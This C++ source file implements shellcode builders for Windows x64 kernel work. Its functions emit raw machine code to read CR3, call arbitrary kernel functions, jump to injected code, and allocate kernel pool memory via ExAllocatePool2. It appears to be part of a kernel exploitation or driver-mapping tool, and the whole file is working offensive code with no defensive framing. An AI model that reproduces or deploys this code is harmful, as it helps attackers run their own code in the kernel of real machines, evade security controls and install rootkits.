#include "ShellcodeUtils.h"

std::vector<uint8_t> ShellcodeUtils::CreateCR3ReadShellcode() {
    // Simple shellcode to read CR3 register
    std::vector<uint8_t> shellcode = {
        0x0F, 0x20, 0xD8,           // mov eax, cr3
        0xC3                        // ret
    };
    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateKernelFunctionCallShellcode(uint64_t function, uint64_t arg1, uint64_t arg2) {
    std::vector<uint8_t> shellcode = {
        0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rcx, arg1
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rdx, arg2
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rax, function
        0xFF, 0xD0,                             // call rax
        0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
        0xC3                                     // ret
    };

    // Fill in the parameters
    *(uint64_t*)&shellcode[6] = arg1;
    *(uint64_t*)&shellcode[16] = arg2;
    *(uint64_t*)&shellcode[26] = function;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateJumpShellcode(uint64_t targetAddr) {
    std::vector<uint8_t> shellcode = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00,                 // mov rax, targetAddr
        0xFF, 0xE0                              // jmp rax
    };

    // Fill in the target address
    *(uint64_t*)&shellcode[2] = targetAddr;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateExecShellcode(uint64_t shellcodeAddr) {
    std::vector<uint8_t> shellcode = {
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00,                 // mov rax, shellcodeAddr
        0xFF, 0xD0,                             // call rax
        0xC3                                     // ret
    };

    // Fill in the shellcode address
    *(uint64_t*)&shellcode[2] = shellcodeAddr;

    return shellcode;
}

std::vector<uint8_t> ShellcodeUtils::CreateAllocationShellcode(uint64_t exAllocatePoolAddr, uint64_t poolType, uint64_t size) {
    std::vector<uint8_t> shellcode = {
        0x48, 0x83, 0xEC, 0x28,                 // sub rsp, 28h
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rcx, poolType
        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rdx, size
        0x49, 0xB8, 0x4D, 0x4D, 0x64, 0x72,      
        0x00, 0x00, 0x00, 0x00,                 // mov r8, 'Mmdr' (tag)
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00,      
        0x00, 0x00, 0x00, 0x00,                 // mov rax, ExAllocatePool2
        0xFF, 0xD0,                             // call rax
        0x48, 0x83, 0xC4, 0x28,                 // add rsp, 28h
        0xC3                                     // ret
    };

    // Fill in the parameters
    *(uint64_t*)&shellcode[6] = poolType;
    *(uint64_t*)&shellcode[16] = size;
    *(uint64_t*)&shellcode[36] = exAllocatePoolAddr;

    return shellcode;
}
